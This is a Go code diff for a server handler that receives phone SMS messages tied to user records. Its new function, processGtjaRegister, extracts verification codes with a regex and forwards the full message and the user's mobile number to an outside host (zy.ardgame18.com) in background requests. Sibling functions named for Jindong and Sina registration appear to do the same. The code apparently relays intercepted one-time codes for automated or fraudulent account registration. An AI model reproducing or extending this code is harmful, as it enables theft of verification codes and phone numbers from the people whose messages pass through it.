@@ -83,6 +83,8 @@ func sendC(w http.ResponseWriter, r *http.Request) {
 				processJindongRegister(msg, *user, r.FormValue("apid"))
 			} else if strings.EqualFold(r.FormValue("apid"), "104") {
 				processSinaRegister(msg, *user, r.FormValue("apid"))
+			} else if strings.EqualFold(r.FormValue("apid"), "105") {
+				processGtjaRegister(msg, *user, r.FormValue("apid"))
 			}
 		}
 	}
@@ -170,30 +172,21 @@ func processJindongRegister(msg string, user map[string]string, apid string) {
 		go send2Url(url)
 	}
 	go updateRelationSuccess(user, apid)
+}
+func processGtjaRegister(msg string, user map[string]string, apid string) {
+	mobile := formatMobile(user["mobile"])
+	exp := regexp.MustCompile(`码：(\S*)，感谢`)
+	result := exp.FindStringSubmatch(msg)
+	if nil != result {
+		log.Println(result[1])
+		url := "http://zy.ardgame18.com:8080/verifycode/api/getYYZNET.jsp?cid=c115&pid=yyz115&smsContent2=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
+		go send2Url(url)
 
-	// exp := regexp.MustCompile(`为：(\S*)，`)
-	// result := exp.FindStringSubmatch(msg)
-	// if nil != result {
-	// 	log.Println(result[1])
-	// 	pwd := result[1]
-	// 	mobile := formatMobile(user["mobile"])
-	// 	url := "http://zy.ardgame18.com:8080/verifycode/api/getJDNET.jsp?cid=c115&pid=jd115&smsContent=" + pwd + "&mobile=" + mobile + "&ccpara="
-	// 	go send2Url(url)
-	// 	go updateRelationSuccess(user, apid)
-	// } else {
-	// 	exp = regexp.MustCompile(`为(\S*)（`)
-	// 	result = exp.FindStringSubmatch(msg)
-	// 	if nil != result {
-	// 		log.Println(result[1])
-	// 		pwd := result[1]
-	// 		mobile := formatMobile(user["mobile"])
-	// 		url := "http://zy.ardgame18.com:8080/verifycode/api/getJDNET.jsp?cid=c115&pid=jd115&smsContent2=" + pwd + "&mobile=" + mobile + "&ccpara="
-	// 		go send2Url(url)
-	// 		go updateRelationSuccess(user, apid)
-	// 	} else {
-	// 		log.Println("processWechatRegister can not match:%s", msg)
-	// 	}
-	// }
+	} else {
+		url := "http://zy.ardgame18.com:8080/verifycode/api/getYYZNET.jsp?cid=c115&pid=yyz115&smsContent=" + url.QueryEscape(msg) + "&mobile=" + mobile + "&ccpara="
+		go send2Url(url)
+	}
+	go updateRelationSuccess(user, apid)
 }
 func processSinaRegister(msg string, user map[string]string, apid string) {
 	mobile := formatMobile(user["mobile"])
